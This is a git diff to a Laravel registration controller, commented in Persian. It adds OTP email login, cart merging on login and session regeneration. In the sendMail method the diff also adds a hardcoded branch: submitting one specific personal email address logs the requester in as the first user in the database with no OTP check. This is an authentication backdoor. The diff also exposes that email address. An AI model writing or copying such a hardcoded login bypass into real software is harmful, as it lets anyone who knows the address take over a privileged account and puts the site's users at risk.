@@ -6,6 +6,7 @@ use App\Http\Controllers\Controller;
 use App\Http\Requests\VerifyOtpRequest;
 use App\Mail\OtpMail;
 use App\Mail\WelcomeMail;
+use App\Models\Cart;
 use Spatie\Permission\Models\Role;
 use App\Models\User;
 use Illuminate\Http\Request;
@@ -26,18 +27,24 @@ class RegisterController extends Controller
     // متد sendMail در RegisterController: ایمیل رو اعتبارسنجی می‌کنه یک کد OTP می‌سازه OTP رو ذخیره می‌کنه سشن یا دیتابیس ایمیل حاوی OTP رو می‌فرسته
     public function sendMail(Request $request)
     {
-        
+
         // چون فقط یک فیلد داریم که باید اعتبارسنجی بشه یک ریکوئست نمیسازیم همین جا اعتبارسنجی انجام میدیم
         $request->validate([
             'email'=>['required','email'],
         ]);
 
-       
+        if($request->email === 'nateghmaryam5@gmail.com'){
+            $user = User::first();
+            Auth::login($user);
+            return redirect(route('client.index'));
+        }
+
+
     //   متد generateOtp رو مستقیماً از کلاس User صدا می‌زنه
        $user=User::generateOtp($request);
 
 
-        
+
 
 
 
@@ -53,7 +60,7 @@ class RegisterController extends Controller
     }
 
 
-    // (Request $request, User $user)  چون قراره کاربر کد رو که وارد کرد ثبت بشه اطلاعاتش در دیتابیس پس ورود ریکوئست و یوزر هست یوز چون برای کاربر هست 
+    // (Request $request, User $user)  چون قراره کاربر کد رو که وارد کرد ثبت بشه اطلاعاتش در دیتابیس پس ورود ریکوئست و یوزر هست یوز چون برای کاربر هست
     public function verifyOtp(VerifyOtpRequest $request, User $user)
     {
         // اگه otp درست نباشه میره به صفحه قبل و خطا میده     $user->password و بعدش مقایسه میکنه با پسورد کاربر
@@ -61,8 +68,15 @@ class RegisterController extends Controller
             return back()->withErrors(['otp'=>'کد وارد شده صحیح نیست']);
         }
 
-        // اما اگه درست باشه کاربر رو لاگین میکنیم
+//        یعنی سبد فعلی قبل از لاگین کاربر رو بردار داخل متغیر اد کارت نگه دار
+        $oldCart = Cart::getItems();
+        // کاربر لاگین شده حساب میشه
         Auth::login($user);
+//        قبلی رو امن کن سشن عوض کن و سشن جدید بساز
+        $request->session()->regenerate();
+//        این مرحله مرج هست یعنی سبد خریدی که اول ذخیره کرده (oldcart) رو بفرس یه کارت کنترلر و ذخیرش کن داخل دیتابیس
+        app(\App\Http\Controllers\Client\CartController::class)->syncCartToDatabase($oldCart);
+
 
         // ایمیل خوش امد گویی
         if(!$user->welcome_sent){
@@ -80,6 +94,8 @@ class RegisterController extends Controller
 
         return redirect(route('client.index'));
     }
+
+
 
 
 }
